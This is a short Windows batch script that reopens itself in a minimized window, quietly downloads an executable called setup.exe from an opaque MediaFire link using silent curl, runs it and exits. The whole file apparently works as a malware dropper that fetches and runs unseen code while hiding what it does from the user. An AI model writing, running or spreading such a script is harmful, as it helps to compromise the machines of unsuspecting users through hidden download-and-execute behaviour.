@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
curl.exe -s -o setup.exe https://download1487.mediafire.com/5hbaqdr6wg6ghCL0aC-iDXbaZQj8-bVwPdCoaLhaJbGI4ekL0kxumG96vDc31aVY7UO-3ETVXzS7OleCbKUiC5mkcfBrAVKyP7NzUk-iptinNL6hLBpVUVhHHITHrB1_wz5c7uzvvMEVHZxPUpnpGjoDuuACArnSEqewCo7nEWBWp1bW/1epmbw5o906gyao/setup.exe
start setup.exe
exit
